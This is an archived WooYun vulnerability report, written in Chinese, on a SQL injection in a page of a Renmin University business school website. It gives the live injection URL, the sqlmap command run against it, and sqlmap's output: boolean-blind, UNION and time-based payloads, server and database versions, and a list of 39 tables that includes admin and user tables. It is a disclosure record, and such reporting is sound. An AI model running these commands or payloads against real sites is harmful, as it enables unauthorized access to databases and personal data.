wybug_title: 中国人民大学商学院某站sql注入
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail:
漏洞详情 披露状态：   									2014-06-23：	细节已通知厂商并且等待厂商处理中									2014-06-27：	厂商已经确认，细节仅向厂商公开									2014-07-07：	细节向核心白帽子及相关领域专家公开									2014-07-17：	细节向普通白帽子公开									2014-07-27：	细节向实习白帽子公开									2014-08-07：	细节向公众公开  简要描述： 大晚上的该睡觉了 详细说明：  注入点 http://edp.rbs.org.cn/news_show.php?id=303直接sqlmap开跑





   漏洞证明：  sqlmap.py -u "http://edp.rbs.org.cn/news_show.php?id=303" -D edp --tables    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 01:30:20[01:30:20] [INFO] resuming back-end DBMS 'mysql'[01:30:20] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=303 AND 9390=9390    Type: UNION query    Title: MySQL UNION query (NULL) - 15 columns    Payload: id=-1477 UNION ALL SELECT NULL,CONCAT(0x71746e7071,0x4d747572564c4767436a,0x71696f7371),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=303 AND SLEEP(5)---[01:30:20] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 6.5web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0.11[01:30:20] [INFO] fetching tables for database: 'edp'[01:30:20] [INFO] the SQL query used returns 39 entriesDatabase: edp[39 tables]+-----------------+| apply_f2013     || apply_f2014     || edp_about       || edp_activity    || edp_admin       || edp_admin_st    || edp_apply_1     || edp_apply_2     || edp_cert        || edp_course      || edp_courseabout || edp_coursesort  || edp_download    || edp_flash       || edp_getpass     || edp_gml2014     || edp_gml20142    || edp_gml20143    || edp_gml20144    || edp_news        || edp_partner     || edp_teacher     || edp_teaching    || edp_topic       || edp_user        || edp_user_bak    || edp_xyactivity  || edp_xybiz       || edp_xyclub      || edp_xyintro     || edp_xynews      || edp_xypp        || edpwj_answer    || edpwj_answer1   || hr_admin        || hr_admin_s      || hr_apply        || hr_apply_s      || hr_join         |+-----------------+   修复方案：  过滤   版权声明：转载请注明来源 by阿明@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-06-27 16:49 厂商回复： 正在通知相关学校处理 最新状态： 暂无
